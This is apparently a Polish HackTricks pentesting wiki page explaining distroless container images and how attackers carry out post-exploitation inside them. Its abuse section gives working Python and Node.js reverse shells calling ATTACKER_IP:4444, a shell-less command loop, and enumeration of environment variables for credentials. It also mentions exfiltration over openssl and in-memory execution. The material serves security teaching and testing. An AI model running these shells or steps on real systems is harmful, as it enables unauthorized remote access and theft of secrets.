# Kontenery Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Obraz kontenera **distroless** to obraz zawierający **minimalne komponenty runtime wymagane do uruchomienia jednej konkretnej aplikacji**, przy celowym usunięciu typowych narzędzi dystrybucji, takich jak menedżery pakietów, shelle i duże zestawy ogólnych narzędzi userland. W praktyce obrazy distroless często zawierają wyłącznie binarkę aplikacji lub runtime, współdzielone biblioteki, paczki certyfikatów oraz bardzo mały układ systemu plików.

Nie chodzi o to, że distroless jest nowym mechanizmem izolacji kernela. Distroless to **strategia projektowania obrazu**. Zmienia to, co jest dostępne **wewnątrz** systemu plików kontenera, a nie sposób, w jaki kernel izoluje kontener. To rozróżnienie ma znaczenie, ponieważ distroless wzmacnia środowisko głównie przez ograniczenie tego, co attacker może wykorzystać po uzyskaniu code execution. Nie zastępuje namespaces, seccomp, capabilities, AppArmor, SELinux ani żadnego innego mechanizmu izolacji runtime.

## Dlaczego Istnieje Distroless

Obrazy distroless są używane głównie w celu ograniczenia:

- rozmiaru obrazu
- złożoności operacyjnej obrazu
- liczby pakietów i binariów, które mogą zawierać vulnerabilities
- liczby narzędzi post-exploitation domyślnie dostępnych dla attackera

Dlatego obrazy distroless są popularne w produkcyjnych wdrożeniach aplikacji. Kontener, który nie zawiera shella, menedżera pakietów i niemal żadnych ogólnych narzędzi, jest zwykle łatwiejszy do analizowania pod względem operacyjnym i trudniejszy do interaktywnego wykorzystania po kompromitacji.

Przykłady znanych rodzin obrazów w stylu distroless obejmują:

- obrazy distroless firmy Google
- hardened/minimal images Chainguard

## Czego Nie Oznacza Distroless

Kontener distroless **nie jest**:

- automatycznie rootless
- automatycznie non-privileged
- automatycznie tylko do odczytu
- automatycznie chroniony przez seccomp, AppArmor lub SELinux
- automatycznie odporny na container escape

Nadal możliwe jest uruchomienie obrazu distroless z `--privileged`, współdzieleniem host namespace, niebezpiecznymi bind mounts lub zamontowanym runtime socketem. W takim przypadku obraz może być minimalny, ale kontener nadal może być katastrofalnie niebezpieczny. Distroless zmienia **userland attack surface**, a nie **kernel trust boundary**.

## Typowe Charakterystyki Operacyjne

Gdy skompromitujesz kontener distroless, pierwszą rzeczą, którą zwykle zauważysz, jest to, że typowe założenia przestają być prawdziwe. Może nie być `sh`, `bash`, `ls`, `id`, `cat`, a czasami nawet środowiska opartego na libc, które działałoby tak, jak oczekuje tego Twój zwykły tradecraft. Wpływa to zarówno na offense, jak i defense, ponieważ brak narzędzi zmienia debugging, incident response oraz post-exploitation.

Najczęstsze wzorce to:

- runtime aplikacji istnieje, ale niewiele więcej
- shell-based payloads zawodzą, ponieważ nie ma shella
- typowe one-linery do enumeracji zawodzą, ponieważ brakuje binariów pomocniczych
- zabezpieczenia systemu plików, takie jak read-only rootfs lub `noexec` w zapisywalnych lokalizacjach tmpfs, również często są obecne

To połączenie zwykle prowadzi do używania określenia „weaponizing distroless”.

## Distroless I Post-Exploitation

Głównym wyzwaniem offense w środowisku distroless nie zawsze jest początkowe RCE. Często ważniejsze jest to, co następuje później. Jeśli zaatakowany workload zapewnia code execution w runtime języka, takiego jak Python, Node.js, Java lub Go, możesz być w stanie wykonywać dowolną logikę, ale nie za pomocą typowych shell-centric workflows, które są powszechne na innych targetach Linux.

Oznacza to, że post-exploitation często zmierza w jednym z trzech kierunków:

1. **Użycie istniejącego runtime języka bezpośrednio** do enumeracji środowiska, otwierania socketów, odczytu plików lub przygotowania dodatkowych payloadów.
2. **Wprowadzenie własnych narzędzi do pamięci**, jeśli system plików jest tylko do odczytu lub zapisywalne lokalizacje są zamontowane z `noexec`.
3. **Wykorzystanie istniejących binariów obecnych już w obrazie**, jeśli aplikacja lub jej zależności zawierają coś niespodziewanie użytecznego.

## Abuse

### Enumeruj Istniejący Runtime

W wielu kontenerach distroless nie ma shella, ale nadal dostępny jest runtime aplikacji. Jeśli targetem jest usługa Python, Python jest dostępny. Jeśli targetem jest Node.js, dostępny jest Node. Często zapewnia to wystarczającą funkcjonalność do enumeracji plików, odczytu zmiennych środowiskowych, otwierania reverse shells i przygotowania in-memory execution bez konieczności wywoływania `/bin/sh`.

Prosty przykład z użyciem Pythona:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Prosty przykład z Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Wpływ:

- odzyskiwanie zmiennych środowiskowych, często zawierających dane uwierzytelniające lub endpointy usług
- enumeracja systemu plików bez `/bin/ls`
- identyfikacja ścieżek z prawem zapisu i zamontowanych sekretów

### Reverse Shell Without `/bin/sh`

Jeśli obraz nie zawiera `sh` ani `bash`, klasyczny reverse shell oparty na shellu może natychmiast zakończyć się niepowodzeniem. W takiej sytuacji użyj zainstalowanego runtime'u języka.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Jeśli `/bin/sh` nie istnieje, zastąp ostatnią linię bezpośrednim wykonywaniem poleceń sterowanym przez Python lub pętlą REPL Pythona.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Ponownie, jeśli `/bin/sh` nie istnieje, użyj bezpośrednio API systemu plików, procesów i sieci Node zamiast uruchamiać shell.

### Pełny przykład: pętla poleceń Python bez shella

Jeśli obraz zawiera Python, ale nie ma żadnego shella, prosta interaktywna pętla często wystarcza, aby zachować pełne możliwości post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Nie wymaga to interaktywnego pliku binarnego powłoki. Z perspektywy atakującego wpływ jest zasadniczo taki sam jak w przypadku podstawowej powłoki: wykonywanie poleceń, enumeracja oraz przygotowywanie kolejnych payloadów za pośrednictwem istniejącego runtime'u.

### Wykonywanie narzędzi w pamięci

Obrazy Distroless są często łączone z:

- `readOnlyRootFilesystem: true`
- zapisywalnym, ale `noexec` tmpfs, takim jak `/dev/shm`
- brakiem narzędzi do zarządzania pakietami

Takie połączenie sprawia, że klasyczne rozwiązania typu „pobierz plik binarny na dysk i uruchom go” stają się zawodne. W takich przypadkach techniki wykonywania z pamięci stają się głównym rozwiązaniem.

Dedykowana strona znajduje się tutaj:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Najbardziej istotne techniki opisane na tej stronie to:

- `memfd_create` + `execve` za pośrednictwem scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Istniejące pliki binarne już w obrazie

Niektóre obrazy Distroless nadal zawierają niezbędne operacyjnie pliki binarne, które stają się przydatne po uzyskaniu dostępu. Często obserwowanym przykładem jest `openssl`, ponieważ aplikacje czasami potrzebują go do zadań związanych z kryptografią lub TLS.

Szybki wzorzec wyszukiwania to:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Jeśli obecny jest `openssl`, może być użyteczny do:

- outbound TLS connections
- data exfiltration przez dozwolony kanał egress
- staging danych payloadów za pośrednictwem zakodowanych/zaszyfrowanych blobów

Dokładny sposób abuse zależy od tego, co faktycznie jest zainstalowane, ale ogólna idea jest taka, że distroless nie oznacza „żadnych narzędzi”; oznacza „znacznie mniej narzędzi niż w zwykłym obrazie dystrybucji”.

## Checks

Celem tych checks jest ustalenie, czy obraz jest faktycznie distroless oraz które binaria runtime lub helper binaries są nadal dostępne na potrzeby post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Co jest tutaj interesujące:

- If no shell exists but a runtime such as Python or Node is present, post-exploitation powinno przejść na runtime-driven execution.
- If root filesystem jest read-only, a `/dev/shm` jest writable, ale ma `noexec`, techniki memory execution stają się znacznie bardziej istotne.
- If helper binaries takie jak `openssl`, `busybox` lub `java` są dostępne, mogą oferować wystarczającą funkcjonalność do bootstrapowania dalszego dostępu.

## Domyślne ustawienia runtime

| Styl image / platformy | Stan domyślny | Typowe zachowanie | Częste ręczne osłabienia |
| --- | --- | --- | --- |
| Obrazy w stylu Google distroless | Minimalny userland z założenia | Brak shella, package managera i tylko zależności aplikacji/runtime | dodawanie warstw debugujących, shelli sidecar, kopiowanie busybox lub narzędzi |
| Minimalne obrazy Chainguard | Minimalny userland z założenia | Ograniczona powierzchnia pakietów, często skoncentrowana na jednym runtime lub serwisie | używanie `:latest-dev` lub wariantów debug, kopiowanie narzędzi podczas builda |
| Workloady Kubernetes używające obrazów distroless | Zależy od konfiguracji Poda | Distroless wpływa tylko na userland; security posture Poda nadal zależy od specyfikacji Poda i domyślnych ustawień runtime | dodawanie ephemeral debug containers, mountów hosta, uprzywilejowanych ustawień Poda |
| Docker / Podman uruchamiające obrazy distroless | Zależy od flag uruchomieniowych | Minimalny filesystem, ale bezpieczeństwo runtime nadal zależy od flag i konfiguracji daemona | `--privileged`, współdzielenie namespace’ów hosta, mounty socketów runtime, zapisywalne bind mounty hosta |

Kluczowe jest to, że distroless jest **właściwością image**, a nie ochroną runtime. Jego wartość wynika z ograniczenia tego, co jest dostępne wewnątrz filesystemu po compromise.

## Powiązane strony

W przypadku bypassów ochrony filesystemu i memory execution często potrzebnych w środowiskach distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

W przypadku nadużyć container runtime, socketów i mountów, które nadal mają zastosowanie do workloadów distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
